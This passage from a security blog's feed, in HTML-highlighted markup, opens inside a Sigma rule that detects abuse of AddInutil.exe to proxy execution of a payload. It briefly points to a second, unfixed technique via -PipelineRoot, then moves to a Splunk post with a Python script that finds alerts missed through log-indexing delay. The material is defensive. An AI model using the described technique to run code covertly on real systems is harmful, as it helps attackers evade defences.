font-style: inherit;">status</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> experimental</span></span>
<span id="cb11-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">description</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">: </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">|</span></span>
<span id="cb11-5">    Detects uncommon child processes of the Add-In deployment cache updating utility (AddInutil.exe) which could be a sign of potential abuse of the binary to proxy execution via a custom Addins.Store payload.</span>
<span id="cb11-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">references</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-7"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html</span></span>
<span id="cb11-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">author</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Michael McKinley (@McKinleyMike), Tony Latteri (@TheLatteri)</span></span>
<span id="cb11-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">date</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 2023/09/18</span></span>
<span id="cb11-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tags</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> attack.defense_evasion</span></span>
<span id="cb11-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> attack.t1218</span></span>
<span id="cb11-13"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">logsource</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">category</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> process_creation</span></span>
<span id="cb11-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">product</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> windows</span></span>
<span id="cb11-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">detection</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">selection</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ParentImage|endswith</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\addinutil.exe'</span></span>
<span id="cb11-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">filter_main_werfault</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Image|endswith</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">':\Windows\System32\conhost.exe'</span></span>
<span id="cb11-22"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">':\Windows\System32\werfault.exe'</span></span>
<span id="cb11-23"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">':\Windows\SysWOW64\werfault.exe'</span></span>
<span id="cb11-24"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">condition</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> selection and not 1 of filter_main_*</span></span>
<span id="cb11-25"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">falsepositives</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-26"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Unknown</span></span>
<span id="cb11-27"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">level</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> medium</span></span></code></pre></div>
</section>
<section id="bonus" class="level3">
<h3 class="anchored" data-anchor-id="bonus">Bonus</h3>
<p>There is second proxy execution technique in <code>AddinUtil.exe</code> that uses the parameter <code>-PipelineRoot:</code>. We will leave this as an exercise for the reader to reproduce.</p>
<p><video src="PipelineRoot-LOLBAS.mp4" title="Fig 2. AddinUtil.exe PipelineRoot Proof of Concept" class="img-fluid" controls=""><a href="PipelineRoot-LOLBAS.mp4">Video</a></video> <em>Fig 2. AddinUtil.exe PipelineRoot LOLBAS Proof of Concept</em></p>
</section>
<section id="closing-notes" class="level3">
<h3 class="anchored" data-anchor-id="closing-notes">Closing Notes</h3>
<ul>
<li>Microsoft is aware and determined this does not cross a security boundary, it will not be remediated.</li>
</ul>


</section>

 ]]></description>
  <guid>https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html</guid>
  <pubDate>Mon, 18 Sep 2023 04:00:00 GMT</pubDate>
</item>
<item>
  <title>Log Timing Delays in Splunk Could be Putting Your Security at Risk</title>
  <dc:creator>Michael McKinley</dc:creator>
  <link>https://www.blue-prints.blog/content/blog/posts/splunk/splunklogdelay.html</link>
  <description><![CDATA[ 




<p><strong>BLUF:</strong> Logging delay to Splunk as little as 100ms can cause missed alerts.</p>
<section id="a-tale-of-two-times" class="level3">
<h3 class="anchored" data-anchor-id="a-tale-of-two-times">A Tale of Two Times</h3>
<p>Splunk is a powerful platform for collecting, indexing and analyzing data from various sources. However, it is critically important to understand the nuances of how Splunk handles time; forgoing such consideration may lead to missing critical events.</p>
<section id="time" class="level4">
<h4 class="anchored" data-anchor-id="time">_time</h4>
<p>The <code>_time</code> field in Splunk represents the timestamp of an event as specified by the source log. This field is critical for time-based analysis, such as identifying trends, detecting anomalies, and correlating events across different sources. This is the time that Splunk visualizes when viewing search results and is used as the time variable when performing searches.</p>
</section>
<section id="indextime" class="level4">
<h4 class="anchored" data-anchor-id="indextime">_indextime</h4>
<p>The <code>_indextime</code> field in Splunk represents the timestamp when Splunk indexes the event, which may not always be the same as the <code>_time</code> field. Simply, it’s the time Splunk logged the event, and it will almost always differ from <code>_time</code> even if by milliseconds.</p>
</section>
</section>
<section id="a-wrinkle-in-time" class="level3">
<h3 class="anchored" data-anchor-id="a-wrinkle-in-time">A Wrinkle in Time</h3>
<p><strong>Why do the times differ?</strong></p>
<p>Truth is, there is a delay. There are many points in the ingestion pipeline that can cause delay, such as:</p>
<ul>
<li>Network latency</li>
<li>Logging throughput capacity</li>
<li>Logging interval</li>
<li>Clock skew</li>
</ul>
<p>Timing delays in Splunk can cause missed alerts, which may result in serious consequences for security and other critical operations.</p>
<p>For instance, if an alert is monitoring a critical system, but there is a delay between the <code>_time</code> and <code>_indextime</code> timestamps, <strong>the alert may not be triggered even when events occur.</strong></p>
</section>
<section id="small-delay-big-problem" class="level3">
<h3 class="anchored" data-anchor-id="small-delay-big-problem">Small Delay = Big Problem</h3>
<p><strong>How much delay can cause missed events?</strong></p>
<p>Delays of milliseconds can result in missed events. During testing in the worst case scenario, <strong>delays of 100ms resulted in missed events</strong>. Theoretically the delay can be even be lower. This raises an important question - are you confident that all of your critical logging sources consistently log in near real-time?</p>
</section>
<section id="delay-detection" class="level3">
<h3 class="anchored" data-anchor-id="delay-detection">Delay Detection</h3>
<p><strong>Can I calculate delays in my log sources?</strong></p>
<p>Yes, Splunk has a great article on this: <a href="https://docs.splunk.com/Documentation/Splunk/9.0.4/Troubleshooting/Troubleshootingeventsindexingdelay">here</a>.</p>
<p>TL;DR To discover log delays subtract <code>_time</code> from <code>_indextime</code>.</p>
<p><code>index=example_delay | eval delay_sec=_indextime-_time | eval delay_minute=(delay_sec/60) | timechart span=1h avg(delay_minute) by index</code></p>
<p><img src="https://www.blue-prints.blog/content/blog/posts/splunk/splunk_blog_1.png" title="Fig 1. Example Timechart for Splunk Search" class="quarto-discovered-preview-image img-fluid"> <em>Fig 1. Example Timechart for Splunk Search</em></p>
<p><strong>Can I discover if any of my recent saved searches missed events?</strong></p>
<p>Yes, a simple method is to re-run the search over the same period and compare the results. If the results differ over there is likely a timing issue.</p>
<p>Below is an example script in Python to identify saved searches with timing issues. Usage information: <a href="https://github.com/SILJAEUROPA/Splunk-Delay-Detector">here</a>.</p>
<p>I’ve run this script against a lab instance of Splunk with intentionally induced delays, the results are below.</p>
<div class="cell">
<div class="sourceCode cell-code" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb1-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#Code to detect and graph differences in recently ran searches</span></span>
<span id="cb1-2"></span>
<span id="cb1-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Import required libraries</span></span>
<span id="cb1-4"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> time</span>
<span id="cb1-5"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> json</span>
<span id="cb1-6"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> splunklib.client <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">as</span> client</span>
<span id="cb1-7"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> splunklib.results <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">as</span> results</span>
<span id="cb1-8"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> matplotlib.pyplot <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">as</span> plt</span>
<span id="cb1-9"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> matplotlib.dates <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">as</span> mdates</span>
<span id="cb1-10"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> datetime <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> datetime, timedelta</span>
<span id="cb1-11"></span>
<span id="cb1-12"></span>
<span id="cb1-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Function to connect to the Splunk service</span></span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">def</span> splunk_connect(base_url, port, splunk_account, splunk_password):</span>
<span id="cb1-15"></span>
<span id="cb1-16">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">try</span>:</span>
<span id="cb1-17">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Connect to the Splunk service</span></span>
<span id="cb1-18">        service <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> client.<span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span>(host<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>base_url, port<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>port, username<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>splunk_account, password<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>splunk_password)</span>
<span id="cb1-19">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Connected to Splunk instance: </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">format</span>(base_url))</span>
<span id="cb1-20">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">90</span>)</span>
<span id="cb1-21">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">except</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">Exception</span> <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">as</span> e:</span>
<span id="cb1-22">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Error in Connecting to Splunk: </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">format</span>(e))</span>
<span id="cb1-23">    </span>
<span id="cb1-24">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Return the service object</span></span>
<span id="cb1-25">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> service</span>
<span id="cb1-26"></span>
<span id="cb1-27"></span>
<span id="cb1-28"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Function to compare jobs</span></span>
<span id="cb1-29"><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">def</span> compare_jobs(service,owner,graph):</span>
<span id="cb1-30">    </span>
<span id="cb1-31">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Get the list of search jobs</span></span>
<span id="cb1-32">    search_jobs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> service.jobs.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">list</span>()</span>
<span id="cb1-33">    </span>
<span id="cb1-34">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Loop through the search jobs</span></span>
<span id="cb1-35">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> job <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> search_jobs:</span>
<span id="cb1-36">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># If the job is a saved search and the owner matches the specified owner</span></span>
<span id="cb1-37">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'isSavedSearch'</span>] <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'1'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">and</span> job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'access'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'owner'</span>] <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> owner:</span>
<span id="cb1-38">     </span>
<span id="cb1-39">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Initialize lists to store results</span></span>
<span id="cb1-40">            results_list <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> []</span>
<span id="cb1-41">            results_list_new <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> []</span>
<span id="cb1-42">            </span>
<span id="cb1-43">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Set the keyword arguments for the search job</span></span>
<span id="cb1-44">            kwargs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>    {<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"earliest_time"</span>: job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'earliestTime'</span>],</span>
<span id="cb1-45">                         <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"latest_time"</span>: job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'latestTime'</span>],</span>
<span id="cb1-46">                         <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"search_mode"</span>: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"normal"</span>,</span>
<span id="cb1-47">                         <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"output_mode"</span>: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"json"</span>}</span>
<span id="cb1-48">                </span>
<span id="cb1-49">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Get the results of the original job</span></span>
<span id="cb1-50">            job_results <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> job.results(output_mode<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'json'</span>)</span>
<span id="cb1-51">            </span>
<span id="cb1-52">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Parse the results and append them to the results list</span></span>
<span id="cb1-53">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> x <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> results.JSONResultsReader(job_results):</span>
<span id="cb1-54">                results_list.append(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">dict</span>(x))</span>
<span id="cb1-55">                    </span>
<span id="cb1-56">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Create a new job with the same search criteria</span></span>
<span id="cb1-57">            job_new <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> service.jobs.create(job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'eventSearch'</span>],<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">**</span>kwargs)</span>
<span id="cb1-58">            </span>
<span id="cb1-59">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Wait for the new job to finish</span></span>
<span id="cb1-60">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">while</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">not</span> job_new.is_done():</span>
<span id="cb1-61">                time.sleep(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>)</span>
<span id="cb1-62">                    </span>
<span id="cb1-63">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Get the results of the new job</span></span>
<span id="cb1-64">            job_results_new <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> job_new.results(output_mode<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'json'</span>)</span>
<span id="cb1-65">            </span>
<span id="cb1-66">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Parse the results and append them to the new results list</span></span>
<span id="cb1-67">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> y <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> results.JSONResultsReader(job_results_new):</span>
<span id="cb1-68">                results_list_new.append(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">dict</span>(y))</span>
<span id="cb1-69">                </span>
<span id="cb1-70">            <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Compare the lengths of the results lists</span></span>
<span id="cb1-71">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span>(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">len</span>(results_list) <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">!=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">len</span>(results_list_new)):</span>
<span id="cb1-72">                <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Initialize lists to store issues</span></span>
<span id="cb1-73">                search_issue <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> []</span>
<span id="cb1-74">                results_indexed <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> []</span>
<span id="cb1-75">                results_time <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> []</span>
<span id="cb1-76">                <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Add the search issue to the list</span></span>
<span id="cb1-77">                search_issue.append({</span>
<span id="cb1-78">                    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'sid'</span>: job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'sid'</span>],</span>
<span id="cb1-79">                    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'label'</span>: job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'label'</span>],</span>
<span id="cb1-80">                    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'earliest_time'</span>: job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'earliestTime'</span>],</span>
<span id="cb1-81">                    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'latest_time'</span>: job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'latestTime'</span>],</span>
<span id="cb1-82">                })</span>
<span id="cb1-83">                    </span>
<span id="cb1-84">                <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Get the unique keys for the results</span></span>
<span id="cb1-85">                results_keys <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> [(d.get(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_raw'</span>), d.get(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_indextime'</span>), d.get(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_time'</span>)) <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> d <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> results_list]</span>
<span id="cb1-86">                results_keys_new <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> [(d.get(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_raw'</span>), d.get(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_indextime'</span>), d.get(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_time'</span>)) <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> d <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> results_list_new]</span>
<span id="cb1-87">                </span>
<span id="cb1-88">                <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Find the unique results in the new results list</span></span>
<span id="cb1-89">                unique_to_new <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">set</span>(results_keys_new) <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">set</span>(results_keys)</span>
<span id="cb1-90"></span>
<span id="cb1-91">                <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># print the unique results</span></span>
<span id="cb1-92">                <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> unique_to_new:</span>
<span id="cb1-93">                    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'SEARCH: </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> SID: </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">format</span>(job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'label'</span>],job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'sid'</span>]))</span>
<span id="cb1-94">                    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'RESULT: DIFFERENCE FOUND'</span>)</span>
<span id="cb1-95">                    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'NOTE: This is indicative of a delay issue and resulted in missing events in the original search.'</span>)</span>
<span id="cb1-96">                    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>)</span>
<span id="cb1-97">                    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'List of Missing Results'</span>)</span>
<span id="cb1-98">                    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>)</span>
<span id="cb1-99">                    </span>
<span id="cb1-100">                    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#format time and set in index</span></span>
<span id="cb1-101">                    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> key <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> unique_to_new:</span>
<span id="cb1-102">                        formatted_indextime <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> datetime.utcfromtimestamp(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">int</span>(key[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>])).strftime(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%Y-%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> %H:%M:%S'</span>)</span>
<span id="cb1-103">                        results_indexed.append(formatted_indextime)</span>
<span id="cb1-104">                        formatted_time <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> datetime.fromisoformat(key[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>]).strftime(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%Y-%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> %H:%M:%S'</span>)</span>
<span id="cb1-105">                        results_time.append(formatted_time)</span>
<span id="cb1-106">                        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
